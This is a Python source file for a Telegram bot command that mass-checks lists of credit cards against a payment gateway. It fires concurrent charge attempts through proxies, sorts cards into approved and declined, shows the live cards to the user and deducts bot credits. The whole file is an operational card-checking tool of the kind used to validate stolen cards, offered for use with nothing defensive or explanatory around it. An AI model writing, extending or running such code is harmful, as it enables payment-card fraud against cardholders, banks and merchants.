import json
import time
import asyncio
import httpx
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from FUNC.usersdb_func import *
from FUNC.defs import *
from .gate import *
from .response import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *

# Temporary storage of results per user
user_results = {}

# Process a single card
async def mchkfunc(card, user_id, session):
    retries = 3
    for attempt in range(retries):
        try:
            result = await create_cvv_charge(card, session)
            resp = await get_charge_resp(result, user_id, card)
            status = resp["status"]
            response = resp["response"]
            return {"cc": card, "status": status, "response": response}
        except Exception:
            import traceback
            await error_log(traceback.format_exc())
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
            else:
                return {"cc": card, "status": "Declined ❌", "response": "Error/Timeout"}

# Mass check command
@Client.on_message(filters.command("mchk", [".", "/"]))
async def multi(client, message):
    await stripe_mass_auth_cmd(client, message)

# Main mass check function
async def stripe_mass_auth_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)

        # Check permissions
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]

        # Get cards
        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id)
            return
        ccs = getcc[1]

        # Initialize results
        user_results[user_id] = {"approved": [], "declined": []}

        # Initial message with buttons
        msg = await message.reply_text(
            f"- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - Braintree Auth\n"
            f"- 𝐂𝐂 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(ccs)}\n"
            f"- 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 - {first_name}\n"
            f"- 𝐒𝐭𝐚𝐭𝐮𝐬 - Processing...⌛️",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Approved [0]", callback_data=f"show_approved_{user_id}")],
                [InlineKeyboardButton("❌ Declined [0]", callback_data=f"show_declined_{user_id}")]
            ])
        )

        start = time.perf_counter()
        semaphore = asyncio.Semaphore(len(ccs))  # All cards concurrently

        proxies = await get_proxy_format()
        async with httpx.AsyncClient(timeout=12, proxies=proxies, follow_redirects=True) as session:

            async def worker(card):
                async with semaphore:
                    result = await mchkfunc(card, user_id, session)
                    if "Approved" in result["status"]:
                        user_results[user_id]["approved"].append(f"<code>{card}</code> → {result['response']}")
                    else:
                        user_results[user_id]["declined"].append(f"<code>{card}</code> → {result['response']}")

                    # Update buttons live
                    await msg.edit_reply_markup(
                        InlineKeyboardMarkup([
                            [InlineKeyboardButton(f"✅ Approved [{len(user_results[user_id]['approved'])}]", callback_data=f"show_approved_{user_id}")],
                            [InlineKeyboardButton(f"❌ Declined [{len(user_results[user_id]['declined'])}]", callback_data=f"show_declined_{user_id}")]
                        ])
                    )

            # Run all workers concurrently
            await asyncio.gather(*[worker(cc) for cc in ccs])

        # Final summary
        proxy_status = "Live ✨"
        text = (
            f"✅ Finished Mass Check\n"
            f"- Gateway: Braintree Auth\n"
            f"- Total: {len(ccs)} cards\n"
            f"- Approved: {len(user_results[user_id]['approved'])}\n"
            f"- Declined: {len(user_results[user_id]['declined'])}\n\n"
            f"[ﾒ] Checked By ➺ <a href='tg://user?id={message.from_user.id}'>{first_name}</a> [{role}]\n"
            f"[ﾒ] Dev ➺ ⏤ <a href='tg://user?id=8340881349'>𝑺𝑷𝑰𝑫𝑬𝑹</a>\n"
            f"T/t ➺ [{time.perf_counter() - start:0.2f} seconds] | Proxy ➺ {proxy_status}"
        )

        await msg.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"✅ Approved [{len(user_results[user_id]['approved'])}]", callback_data=f"show_approved_{user_id}")],
                [InlineKeyboardButton(f"❌ Declined [{len(user_results[user_id]['declined'])}]", callback_data=f"show_declined_{user_id}")]
            ])
        )

        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# Callback handler to show approved or declined cards
@Client.on_callback_query()
async def callback_handler(client, cq: CallbackQuery):
    data = cq.data
    user_id = data.split("_")[-1]

    if user_id not in user_results:
        await cq.answer("No results for you!", show_alert=True)
        return

    if data.startswith("show_approved"):
        cards = user_results[user_id]["approved"]
        text = "✅ Approved Cards:\n\n" + "\n".join(cards) if cards else "No approved cards."
        await cq.message.reply_text(text)
    elif data.startswith("show_declined"):
        cards = user_results[user_id]["declined"]
        text = "❌ Declined Cards:\n\n" + "\n".join(cards) if cards else "No declined cards."
        await cq.message.reply_text(text)
            
